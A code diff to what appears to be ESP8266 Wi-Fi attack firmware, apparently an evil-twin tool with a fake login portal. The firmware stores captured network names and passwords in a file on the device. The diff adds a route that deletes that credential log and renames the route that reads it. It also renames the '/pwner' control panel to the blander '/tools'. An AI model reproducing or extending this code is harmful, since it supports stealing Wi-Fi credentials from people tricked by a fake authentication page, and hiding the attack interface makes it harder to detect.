@@ -80,7 +80,7 @@ Settings settings;
 SSIDList ssidList;
 
 //yaraklar ///
-void readit(){
+void checklog(){
 String line;
 File f = SPIFFS.open("/c.txt", "r");
   if (!f) {
@@ -102,6 +102,16 @@ void yaz(String kadi,String sifr){
           f.println(kadi + "-" + sifr);
 
 };
+
+void clearlog() {
+  File f = SPIFFS.open("/c.txt", "a");
+  if (!f) {
+    server.send(200, "text/html", "log empty");
+  } else {
+    SPIFFS.remove("/c.txt");
+    server.send(200, "text/html", "success clear log");
+  }
+}
 
 //cukler
 
@@ -503,8 +513,9 @@ yaz(qsid,qpass);
     server.send(200, "text/html", "Web Authentication Login Successful.\n Redirecting..");
         };
 });
-  server.on("/readit", readit);
-  server.on("/pwner", loadIndexHTML);
+  server.on("/checklog", checklog);
+  server.on("/clearlog", clearlog);
+  server.on("/tools", loadIndexHTML);
   //server.on("/index.html", loadIndexHTML);
   server.on("/apscan.html", loadAPScanHTML);
   server.on("/stations.html", loadStationsHTML);
